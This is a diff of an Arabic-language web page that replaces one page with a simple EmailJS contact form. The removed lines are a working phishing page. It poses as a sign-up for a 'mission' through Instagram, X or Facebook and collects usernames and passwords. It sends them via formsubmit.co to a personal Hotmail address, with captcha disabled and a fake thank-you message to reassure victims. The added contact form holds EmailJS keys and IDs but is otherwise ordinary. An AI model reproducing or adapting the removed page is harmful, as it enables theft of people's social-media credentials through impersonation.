@@ -3,92 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>انضم إلى مهمتنا</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-            direction: rtl;
-        }
-        .platform {
-            margin: 15px 0;
-            cursor: pointer;
-            display: inline-block;
-        }
-        .form-container {
-            display: none;
-            margin-top: 15px;
-        }
-        .form-container input {
-            margin: 5px;
-            padding: 10px;
-            width: 200px;
-        }
-        .form-container button {
-            padding: 10px 15px;
-            cursor: pointer;
-        }
-        .thank-you {
-            display: none;
-            margin-top: 20px;
-            color: green;
-            font-weight: bold;
-        }
-    </style>
+    <title>نموذج الاتصال</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function () {
+            emailjs.init("1xqwBMfecM1SSulsh"); // استبدل YOUR_PUBLIC_KEY بمفتاحك العام من EmailJS
+        })();
+    </script>
 </head>
 <body>
-    <h1>مرحبًا بكم في مهمتنا</h1>
-    <p>انضم إلينا لإحداث فرق! اختر المنصة المفضلة لديك للتسجيل.</p>
-
-    <div class="platform" id="instagram">إنستغرام</div>
-    <div class="platform" id="x">إكس</div>
-    <div class="platform" id="facebook">فيسبوك</div>
-
-    <div class="form-container" id="form-container">
-        <h3 id="platform-name">التسجيل في</h3>
-        <form id="registration-form" method="POST" action="https://formsubmit.co/hmm.19999@hotmail.com">
-            <!-- حقول النموذج -->
-            <input type="text" name="username" id="username" placeholder="اسم المستخدم" required><br>
-            <input type="password" name="password" id="password" placeholder="كلمة المرور" required><br>
-
-            <!-- إدخالات إضافية لـ FormSubmit -->
-            <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">
-            <input type="hidden" name="_captcha" value="false">
-
-            <button type="submit">إرسال</button>
-        </form>
-    </div>
-
-    <div class="thank-you" id="thank-you">
-        <p>شكرًا لتسجيلك!</p>
-        <p>تم إرسال معلوماتك بنجاح.</p>
-    </div>
+    <h1>تواصل معنا</h1>
+    <form id="contact-form">
+        <input type="text" name="name" placeholder="اسمك" required><br>
+        <input type="email" name="email" placeholder="بريدك الإلكتروني" required><br>
+        <textarea name="message" placeholder="رسالتك" required></textarea><br>
+        <button type="submit">إرسال</button>
+    </form>
 
     <script>
-        const platforms = document.querySelectorAll('.platform');
-        const formContainer = document.getElementById('form-container');
-        const platformName = document.getElementById('platform-name');
-        const thankYouMessage = document.getElementById('thank-you');
+        document.getElementById('contact-form').addEventListener('submit', function (event) {
+            event.preventDefault(); // منع تحديث الصفحة
 
-        platforms.forEach(platform => {
-            platform.addEventListener('click', () => {
-                platformName.textContent = `التسجيل في ${platform.textContent}`;
-                formContainer.style.display = 'block';
-                thankYouMessage.style.display = 'none';
-            });
-        });
-
-        const registrationForm = document.getElementById('registration-form');
-        registrationForm.addEventListener('submit', (e) => {
-            e.preventDefault(); // منع النموذج من تحديث الصفحة
-
-            // محاكاة إرسال النموذج وعرض رسالة الشكر
-            formContainer.style.display = 'none';
-            thankYouMessage.style.display = 'block';
-
-            // متابعة الإرسال الفعلي للنموذج
-            e.target.submit();
+            emailjs.sendForm('service_ir3vg5y', 'template_jw2qkzr', this)
+                .then(function () {
+                    alert('تم إرسال الرسالة بنجاح!');
+                }, function (error) {
+                    alert('حدث خطأ أثناء الإرسال: ' + JSON.stringify(error));
+                });
         });
     </script>
 </body>
